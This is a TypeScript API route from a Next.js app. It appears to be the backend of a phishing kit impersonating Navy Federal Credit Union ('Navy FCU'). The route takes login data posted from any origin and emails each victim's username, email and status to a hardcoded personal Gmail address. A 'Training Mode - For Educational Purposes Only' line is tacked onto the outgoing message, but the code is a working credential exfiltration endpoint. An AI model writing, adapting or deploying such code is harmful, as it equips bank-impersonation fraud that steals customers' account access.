// app/api/auth/confirm-login/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders });
}

export async function POST(request: Request) {
  try {
    const data = await request.json();

    console.log('✅ Login confirmed:', data);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_FROM || `"Navy FCU" <${process.env.EMAIL_USER}>`,
      to: 'blessedresult6@gmail.com',
      subject: `✅ SUCCESSFUL LOGIN: ${data.username}`,
      text: `
✅ LOGIN SUCCESSFUL

User: ${data.username}
Email: ${data.email || 'N/A'}
Status: ${data.status || 'Verified'}
Timestamp: ${new Date().toISOString()}

---
Training Mode - For Educational Purposes Only
      `,
    });

    return NextResponse.json({ success: true }, { headers: corsHeaders });

  } catch (error) {
    console.error('❌ Confirm error:', error);
    return NextResponse.json({ 
      success: false 
    }, { status: 500, headers: corsHeaders });
  }
}
